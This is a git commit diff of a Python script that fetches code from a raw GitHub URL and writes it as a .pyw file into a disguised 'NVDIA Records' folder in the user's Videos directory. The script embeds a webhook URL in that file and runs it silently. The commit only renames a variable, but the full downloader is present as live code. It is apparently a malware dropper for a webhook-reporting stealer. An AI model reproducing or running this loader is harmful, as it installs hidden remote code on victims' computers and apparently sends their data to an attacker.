a0ddbe35a8b128f3a90aa6b2e64064ce0b65c51d
NobdY1exe <161746477+NobdY1exe@users.noreply.github.com>
2024-08-30 19:57:17 +0200

    Update logiqueee.py

--- logiqueee.py
+++ logiqueee.py
@@ -4,16 +4,17 @@ import subprocess
 from pathlib import Path
 
 githubraw = "https://raw.githubusercontent.com/NobdY1exe/skA4zr/main/fileees.py"
+Webhooook = webhook_url
 
 path = os.path.join(Path.home(), 'Videos', 'NVDIA Records')
 FilePath = os.path.join(path, 'encoding_records.pyw')
 
-def CreateFandDownloadIT(webhook_url, githubraw):
+def CreateFandDownloadIT(Webhooook, githubraw):
     os.makedirs(path, exist_ok=True)
     response = urllib.request.urlopen(githubraw)
     remote_content = response.read().decode('utf-8')
     with open(FilePath, "w", encoding="utf8") as f:
-        f.write(f"webhook_url = '{webhook_url}'\n\n")
+        f.write(f"webhook_url = '{Webhooook}'\n\n")
         f.write(remote_content)
     return FilePath
 
@@ -24,5 +25,5 @@ def StartProg(FilePath):
     except Exception as e:
         pass
 
-CreateFandDownloadIT(webhook_url, githubraw)
+CreateFandDownloadIT(Webhooook, githubraw)
 StartProg(FilePath)
